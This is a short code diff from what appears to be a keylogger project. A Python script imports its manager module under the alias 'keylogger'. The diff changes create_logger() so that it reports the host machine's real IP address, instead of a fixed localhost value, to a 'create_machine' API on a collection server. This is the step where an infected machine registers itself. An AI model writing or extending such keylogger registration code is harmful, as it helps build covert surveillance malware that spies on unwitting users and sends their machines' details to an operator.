@@ -1,12 +1,14 @@
 import manager as keylogger
-import requests
+import requests,socket
 
 url = 'http://127.0.0.1:9734/api/create_machine'
 
 
 def create_logger():
+    hostname = socket.gethostname()
+    ipaddress = socket.gethostbyname(hostname)
     data = {
-        "ip": "127.0.0.1"
+        "ip": ipaddress
     }
     try:
         response = requests.post(url, json=data)
